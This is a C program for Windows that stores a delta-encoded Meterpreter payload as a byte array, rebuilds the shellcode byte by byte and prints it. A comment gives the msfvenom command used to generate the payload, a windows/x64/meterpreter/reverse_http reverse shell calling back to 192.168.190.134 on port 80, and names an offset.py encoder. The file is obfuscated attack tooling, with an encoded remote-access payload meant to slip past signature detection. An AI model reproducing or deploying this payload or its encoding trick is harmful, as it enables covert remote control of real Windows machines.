#include <stdio.h>
#include <string.h>
#include <windows.h>


int main(){
	

	unsigned char first_byte = 0xfc;unsigned char delta[710] = {0x4c, 0x3b, 0x61, 0xc, 0xf8, 0xe4, 0x34, 0x0, 0x0, 0x41, 0x10, 0xf0, 0xf, 0x2, 0xf6, 0xe9, 0xa1, 0x93, 0xe3, 0x43, 0xc7, 0xe, 0xe8, 0x43, 0xc7, 0xc6, 0x30, 0x43, 0xc7, 0xce, 0x31, 0x5, 0xf2, 0xc7, 0xa8, 0x93, 0x0, 0xfe, 0x43, 0xe7, 0xde, 0xfd, 0xe4, 0x98, 0x7f, 0xe9, 0x8f, 0xec, 0x90, 0x25, 0x1b, 0x86, 0x2a, 0xf4, 0x21, 0x80, 0x8, 0x44, 0x34, 0xc0, 0xc0, 0x21, 0xb, 0x65, 0xf6, 0x43, 0xc7, 0xce, 0x6b, 0xb7, 0xfa, 0x5, 0x10, 0xf7, 0xb9, 0xcf, 0x96, 0x1b, 0xf7, 0xa0, 0xf3, 0xf7, 0xd, 0x76, 0xed, 0x8e, 0x0, 0x0, 0x8b, 0xf5, 0x8, 0x78, 0x0, 0x0, 0x48, 0x3d, 0x3b, 0xb4, 0xf3, 0xe1, 0xb9, 0xcf, 0x74, 0x47, 0xb5, 0xe0, 0x29, 0xb8, 0xcf, 0xbb, 0xbd, 0xd0, 0x38, 0x93, 0x73, 0xf2, 0xb7, 0xca, 0x78, 0x4a, 0xa9, 0x54, 0xc5, 0xe4, 0x98, 0x7f, 0xb9, 0xd5, 0x72, 0xe9, 0x8f, 0xec, 0x95, 0x80, 0x8, 0x44, 0x34, 0xc0, 0xc0, 0x77, 0xa8, 0x95, 0x7c, 0x5b, 0xb7, 0x49, 0xd8, 0xe4, 0x3d, 0xf4, 0x98, 0xa4, 0x63, 0x80, 0xec, 0x47, 0xb5, 0xe4, 0x25, 0xb8, 0xcf, 0x96, 0xdb, 0x4a, 0x81, 0x3c, 0xfc, 0x47, 0xb5, 0xdc, 0x2d, 0xb8, 0xcf, 0x71, 0x4a, 0x79, 0x84, 0xb9, 0x17, 0xe9, 0x17, 0xf0, 0xb9, 0xcf, 0x8e, 0xfb, 0x1, 0xe7, 0x17, 0xe9, 0x18, 0xe8, 0x19, 0xee, 0x3b, 0x69, 0x34, 0x21, 0x11, 0xad, 0xe1, 0x78, 0xe9, 0x18, 0x1, 0xee, 0x43, 0x87, 0xd7, 0x62, 0xb4, 0x0, 0x0, 0x5e, 0xeb, 0xe9, 0xaa, 0x78, 0xf6, 0x75, 0xb9, 0xf2, 0x5, 0xfb, 0x5, 0xf7, 0xf, 0x8c, 0x41, 0x15, 0xf2, 0x41, 0x58, 0x68, 0x7e, 0xfb, 0x8a, 0x2b, 0xaf, 0xe1, 0xf8, 0xd6, 0x7e, 0x0, 0x95, 0x88, 0x90, 0x0, 0x0, 0x4d, 0x22, 0xb, 0xef, 0x3, 0x0, 0xf5, 0xce, 0x6, 0xf9, 0x2, 0xf0, 0x8, 0x2f, 0x12, 0x5, 0xf6, 0xb, 0x8, 0xfc, 0xad, 0x2e, 0x6, 0xcc, 0x11, 0xff, 0xfe, 0x2, 0xb, 0xe5, 0x37, 0x12, 0x5, 0xc8, 0xfe, 0x7, 0xe5, 0x58, 0xbe, 0xfe, 0xf5, 0xf7, 0x21, 0x2f, 0x0, 0xfc, 0xf9, 0xf2, 0xe, 0xfd, 0xe9, 0x1e, 0xb, 0xbb, 0x6, 0xfe, 0x4, 0xf7, 0x5, 0x3, 0xea, 0x8, 0x23, 0xfd, 0xc, 0xf9, 0xff, 0xe0, 0xf4, 0x4c, 0xfd, 0x2, 0xfa, 0xbb, 0x27, 0x1e, 0xfe, 0x8, 0x4, 0xba, 0xf7, 0x23, 0x25, 0xa, 0xfd, 0xfe, 0xf8, 0xca, 0x2, 0x2, 0xfe, 0xfd, 0x2, 0xfe, 0x2, 0xfe, 0x2, 0xf0, 0x33, 0xe, 0x5, 0xfb, 0x11, 0xf7, 0xc6, 0x6, 0xfe, 0x4, 0xf7, 0x5, 0x3, 0xca, 0x59, 0xfa, 0x7, 0xf3, 0xe4, 0x8f, 0x8d, 0xe4, 0x98, 0x8a, 0x0, 0xf6, 0x71, 0x80, 0x1c, 0x23, 0x2e, 0x59, 0x0, 0x0, 0x0, 0xff, 0xd6, 0x13, 0x28, 0xf0, 0x0, 0x0, 0x31, 0x8, 0xf9, 0xfc, 0x3, 0x5, 0x2, 0xf6, 0x3, 0x8, 0xf7, 0xfe, 0x3, 0x2, 0x1, 0xcc, 0x5a, 0xee, 0x41, 0x38, 0x88, 0x7e, 0xf9, 0x90, 0xb0, 0x0, 0x0, 0x4d, 0xe4, 0x98, 0x8a, 0x0, 0x17, 0x99, 0x50, 0xf6, 0x71, 0x9d, 0x32, 0x16, 0x27, 0x3a, 0x0, 0x0, 0x0, 0xff, 0xd6, 0x13, 0x63, 0xb5, 0x0, 0x0, 0x2f, 0x46, 0x2, 0xcd, 0x25, 0xf0, 0xf9, 0xfc, 0x24, 0xf1, 0xa, 0xd, 0xd5, 0xe8, 0x16, 0x12, 0x16, 0xfb, 0x3, 0xce, 0x1, 0xe, 0x27, 0xf3, 0xf5, 0xd, 0x2, 0xfb, 0x2, 0xc9, 0x4, 0xff, 0x28, 0xe8, 0x1a, 0xe1, 0xf0, 0x21, 0xfa, 0x27, 0xf1, 0xcc, 0x3b, 0xfe, 0xee, 0xe, 0xde, 0xc, 0x24, 0xc5, 0x0, 0xd, 0x1c, 0x12, 0xdd, 0xf0, 0x17, 0xdd, 0x3c, 0xe5, 0xc, 0xcf, 0x21, 0x17, 0xd8, 0x13, 0xf6, 0x5, 0x1f, 0x3, 0x5, 0x2, 0xfd, 0xb8, 0xd3, 0x48, 0x41, 0x38, 0x92, 0x7, 0xe7, 0x17, 0xf5, 0xe4, 0x98, 0x8a, 0xf5, 0x70, 0x48, 0x2, 0x26, 0x5c, 0x7c, 0x0, 0x0, 0x0, 0x50, 0x3, 0x0, 0xf6, 0x7e, 0xfb, 0x29, 0x6a, 0xd9, 0xd, 0xc4, 0xd6, 0x73, 0x41, 0x3d, 0xa4, 0xa0, 0x55, 0xf4, 0x7, 0xee, 0x41, 0x68, 0x5c, 0xe4, 0x98, 0x84, 0xe4, 0x98, 0x8a, 0x0, 0xf6, 0x7e, 0xfb, 0x6b, 0xd9, 0x12, 0x63, 0x84, 0xd6, 0xb0, 0x3b, 0xb5, 0xaa, 0x29, 0x7f, 0xfa, 0xc7, 0x8b, 0xed, 0x0, 0x49, 0x71, 0x8a, 0xac, 0x45, 0xab, 0x20, 0x0, 0x0, 0x0, 0xff, 0xd6, 0x73, 0xb7, 0xd0, 0xa5, 0x8e, 0xe9, 0xe1, 0x1c, 0x6d, 0xab, 0x0, 0x0, 0x53, 0x6, 0x11, 0xd6, 0x1a, 0xef, 0x40, 0x48, 0xf0, 0x21, 0x2e, 0x39, 0x7e, 0xf9, 0x40, 0x10, 0xf0, 0x0, 0x49, 0x71, 0x9e, 0x4c, 0xaf, 0x92, 0x1b, 0x0, 0x0, 0x0, 0xff, 0xd6, 0x73, 0x4b, 0xc0, 0x0, 0xf5, 0x41, 0x5e, 0x61, 0x41, 0x68, 0x57, 0x41, 0x51, 0x6f, 0x7e, 0xf9, 0x40, 0x20, 0xe0, 0x0, 0x49, 0x40, 0x70, 0x50, 0x71, 0x58, 0x84, 0xf3, 0x59, 0x1e, 0x0, 0x0, 0x0, 0xff, 0xd6, 0x73, 0x3b, 0x41, 0x5c, 0x65, 0x3b, 0xb4, 0x3e, 0xb4, 0x25, 0x7c, 0x41, 0xb9, 0xc2, 0xc2, 0x3b, 0xb5, 0x5d, 0x86, 0x6b, 0x95, 0x12, 0x96, 0x59, 0xf0, 0x7e, 0xfb, 0x2e, 0xc5, 0xed, 0xb4, 0xa9, 0xd6 };unsigned char shellcode[711] = { 0x00 };

	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o met.bin
	// python3 offset.py -i met.bin

	//Size of shellcode array
	int cap = sizeof(delta) / sizeof(delta[0]);

	//Setting first byte of the reconstituted array to the first byte of the payload
	shellcode[0] = first_byte;

	// keep track of our positions
	unsigned int delta_idx, shellcode_idx;
	
	/* Take initial byte and add the delta to it to get the second byte. Take second byte
	and add second delta to get third byte and so on. */
	for (delta_idx = 0; delta_idx < cap; delta_idx++)
	{
		shellcode_idx = delta_idx + 1;
		shellcode[shellcode_idx] = shellcode[delta_idx] + delta[delta_idx];
	}


	for (int l = 0; l < cap + 1; l++)
	{
		//Last run needs to print closing bracket and semicolon
		if (l == (cap)) {
			printf("0x%02x", shellcode[l]);
		}
		else {
			//Added a 1 because initial loop is true and adds a newline. This causes it to print 15 bytes and then a new line
			if ((l + 1) % 15 == 0) {
				printf("0x%02x,\n", shellcode[l]);
			}
			else {
				printf("0x%02x,", shellcode[l]);
			}
		}
	}
	
	return 0;
}
